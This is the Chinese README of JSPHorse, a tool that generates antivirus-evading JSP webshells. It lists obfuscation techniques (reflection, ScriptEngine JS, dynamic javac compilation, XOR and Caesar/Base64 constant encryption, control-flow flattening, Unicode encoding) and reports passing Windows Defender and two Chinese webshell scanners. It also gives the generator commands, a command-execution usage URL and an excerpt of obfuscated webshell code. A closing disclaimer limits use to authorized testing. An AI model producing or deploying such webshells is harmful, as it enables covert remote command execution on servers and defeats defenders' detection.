# JSPHorse

![](https://img.shields.io/badge/build-passing-brightgreen)
![](https://img.shields.io/badge/JavaParser-3.23.1-blue)
![](https://img.shields.io/badge/Java-8-red)

## 简介

一个JSP免杀Webshell生成器，目前仅支持普通回显Webshell，后续可能支持冰蝎等

```txt
　　 へ　　　　　／|
　　/＼7　　　 ∠＿/
　 /　│　　 ／　／
　│　Z ＿,＜　／　　 /`ヽ
　│　　　　　ヽ　　 /　　〉
　 Y　　　　　`　 /　　/
　?●　?　●　　??〈　　/
　()　 へ　　　　|　＼〈
　　>? ?_　 ィ　 │ ／／
　 / へ　　 /　?＜| ＼＼
　 ヽ_?　　(_／　 │／／
　　7　　　　　　　|／
　　＞―r￣￣~∠--|
```

特点：

- Java反射调用
- ScriptEngine调用JS免杀
- 使用分割和注释绕过可能的JS黑名单
- Javac动态编译class免杀（参考三梦师傅代码）
- 双重随机异或运算加密数字常量
- 凯撒密码随机偏移并结合Base64双重加密字符串常量
- 使用控制流平坦化并随机生成分发器
- 所有标识符全部替换为随机字符串
- 支持全局Unicode编码
- 每次执行都会生成完全不同的马（结构相同内容不同）

简单测试了免杀效果：

| 名称 | 测试结果 |
| :----: | :----: |
| 百度WEBDIR+ | ![](https://img.shields.io/badge/pass-green) |
| 河马SHELLPUB | ![](https://img.shields.io/badge/pass-green) |
| Windows Defender | ![](https://img.shields.io/badge/pass-green) |

## Quick Start

在Github右侧Release页面下载

生成标准形式Webshell

`java -jar JSPHorse.jar -p your_password`

全局Unicode编码（JSP支持全局Unicode编码）

`java -jar JSPHorse.jar -p your_password -u`

生成进阶版Webshell（Javac动态编译class）

`java -jar JSPHorse.jar -p your_password --super`

进阶版Webshell基础上全局Unicode编码

`java -jar JSPHorse.jar -p your_password --super -u`

使用ScriptEngine调用JS免杀

`java -jar JSPHorse.jar -p your_password --js`

使用ScriptEngine调用JS免杀基础上全局Unicode编码

`java -jar JSPHorse.jar -p your_password --js -u`

如何使用？

1.jsp?pwd=your_password&cmd=calc.exe

生成JSP大致代码如下：

```java
 try {
        String[] bUKHeZoxwrAKYLkjvcMP = new String[] { "NXwwfDJ8M3w3fDl8MTB8MTF8Nnw4fDF8NA==", "eGVs", "a3Vs", "amF2YS5sYW5nLlJ1bnRpbWU=", "b21iWmN2YnF1bQ==", "bWZtaw==", "PHByZT4=", "PC9wcmU+" };
        String CSLEQilaJEXYTqhIDubS = dec(bUKHeZoxwrAKYLkjvcMP[((627747 ^ 1285107) ^ (217916 ^ 1662188))], ((362867 ^ 1112231) ^ (464295 ^ 1205371)));
        String[] jhetxjKiUeIqIeKBycOb = CSLEQilaJEXYTqhIDubS.split("\\|");
        int jEpUBflQcOJKNizndvCp = ((525415 ^ 1384817) ^ (317417 ^ 1700607));
        String UQIOIelnYKguiPiMnaQT = null;
        String nawTPQyIRdcwDULZVBSF = null;
        Class PGyKjvgngwNbFYoJPbaj = null;
        java.lang.reflect.Method EbTdlrXQiEuMcgyFuGyY = null;
        java.lang.reflect.Method HGjRkjZSeXejrnHgtgIq = null;
        Process gVCGkwmXVnpDbwgkpiyP = null;
        java.io.InputStream DIFNoxuAzWMRCwXZtJWB = null;
        byte[] RDwBQBJtrIRqaxomirvG = null;
        while (true) {
            int OKovVnfpZyAFhVlmyglP = Integer.parseInt(jhetxjKiUeIqIeKBycOb[jEpUBflQcOJKNizndvCp++]);
            switch(OKovVnfpZyAFhVlmyglP) {
                case ((303670 ^ 1554191) ^ (15449 ^ 1255776)):
                    nawTPQyIRdcwDULZVBSF = request.getParameter(dec(bUKHeZoxwrAKYLkjvcMP[((2039625 ^ 1074544) ^ (1424304 ^ 1753483))], ((841358 ^ 1837015) ^ (835561 ^ 1863352))));
                    break;
                case ((849435 ^ 1174311) ^ (325714 ^ 1697127)):
                    HGjRkjZSeXejrnHgtgIq = PGyKjvgngwNbFYoJPbaj.getMethod(dec(bUKHeZoxwrAKYLkjvcMP[((673702 ^ 1287280) ^ (321257 ^ 1901882))], ((534640 ^ 1947587) ^ (300141 ^ 1117142))), String.class);
                    break;
                case ((346862 ^ 1984726) ^ (144870 ^ 1652694)):
                    out.print(dec(bUKHeZoxwrAKYLkjvcMP[((591409 ^ 1247053) ^ (1047216 ^ 1440714))], ((1916117 ^ 1041302) ^ (390214 ^ 1518349))));
                    break;
......................................................
```

## 免责申明

未经授权许可使用`JSPHorse`攻击目标是非法的

本程序应仅用于授权的安全测试与研究目的


